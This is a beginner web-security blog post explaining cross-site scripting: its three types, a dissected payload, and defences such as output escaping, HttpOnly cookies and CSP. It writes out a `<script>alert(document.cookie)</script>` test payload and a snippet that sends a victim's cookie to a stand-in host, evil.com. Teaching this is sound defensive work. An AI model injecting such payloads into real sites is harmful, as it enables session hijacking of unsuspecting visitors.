---
title: "XSS 101: Why Your Browser Executes Other People's Code"
date: "2026-08-19"
description: "Web security lesson two: what XSS is, how reflected/stored/DOM types differ, what one <script> tag can cost you, and why escaping stops it."
tags: ["Security", "Web Security"]
---

Last time we covered [SQL injection](/en/blog/sql-injection): the backend executes input as code, and the database falls. Today, its sibling vulnerability — XSS. This time, the **browser** is the one executing the attacker's code.

## It starts with a comment section

Suppose a site's guestbook has a flaw: whatever users submit is printed back **verbatim**.

A visitor leaves this "comment":

```html
<script>alert(document.cookie)</script>
```

The next visitor opens the page, and the browser runs that text as **page code** — the popup doesn't show the attacker's anything; it shows the victim's **own session credentials**.

The attacker stole nothing directly. Everyone who views that comment gets hit. This is XSS — Cross-Site Scripting.

## Try it yourself

The guestbook below renders input verbatim (don't worry — this lab only does **plain-text display**, nothing actually executes):

::: warning
交互式 XSS 实验将在 VitePress 客户端组件中提供。
:::

Tap one of the preset payloads, or type something starting with `<script>` or `onerror` and watch the verdict.

## Three types, three injection points

| Type | Where it enters | When it fires | Severity |
| --- | --- | --- | --- |
| Reflected | URL parameters, form input | Victim clicks a **crafted link** | Needs a click |
| Stored | Content **saved to the database** (comments, nicknames) | **Automatic** for anyone who opens the page | Highest — hits everyone |
| DOM-based | Never touches the server; the frontend JS mishandles input | On page load | Sneakiest, hardest to find |

**Reflected** XSS is an echo: `?q=<script>…</script>` gets written back into the page by the server, affecting only whoever opens that link. Attackers hide it in phishing emails and short links.

**Stored** XSS plants code *on the server*. Comment sections, reviews, usernames — every visitor loads it. The guestbook example above is stored XSS.

**DOM-based** XSS is the odd one: the request **never contains** the code. Say the frontend uses `innerHTML` to splice a URL fragment into the page — the browser only "reveals" the code at execution time, and the server never knows.

## Dissecting one payload

```html
<script>alert(document.cookie)</script>
```

- `<script>`: tells the browser "executable code follows"
- `alert()`: the popup (attackers use it to verify the flaw; real attacks swap in exfiltration code)
- `document.cookie`: the site's cookies

What an attacker actually wants isn't a popup — it's a `fetch` to their own server:

```html
<script>
  fetch("https://evil.com/steal?c=" + encodeURIComponent(document.cookie));
</script>
```

With the cookie in hand, they can **impersonate you** — session hijacking.

## Why XSS is so hard to kill

Because the hole it exploits is this: **browsers can't tell code from data**. When user input lands inside a page, the browser has no way to know whether it's "comment text" or "page instructions" — so it executes.

Same root cause as [SQL injection](/en/blog/sql-injection): data treated as code. The only difference is that the "executor" changed from the database to the browser.

## The three-part defense

**1. Output escaping**: turn `<` into `&lt;`, and the browser renders it as text, not code. This is the fundamental fix — modern frameworks like React escape by default; stitching strings into `innerHTML` is where people get hurt.

**2. HttpOnly cookies**: mark a cookie `HttpOnly` and JavaScript can't read `document.cookie` — even a successful XSS can't touch your most valuable data.

**3. CSP (Content Security Policy)**: a response header that tells the browser "only run scripts from these origins". Even if injection lands, external scripts won't load.

> In one line: **never trust input, never concatenate output** — the same conclusion as last time, still holding.

## Next steps

1. Play with the XSS and SQLi labs in the [security section](/en/security)
2. PortSwigger Academy's free XSS labs — start with "reflected XSS"
3. If you enjoy this kind of puzzle, [CTF for beginners](/en/blog/ctf-intro) covers the web category, where XSS challenges are everywhere
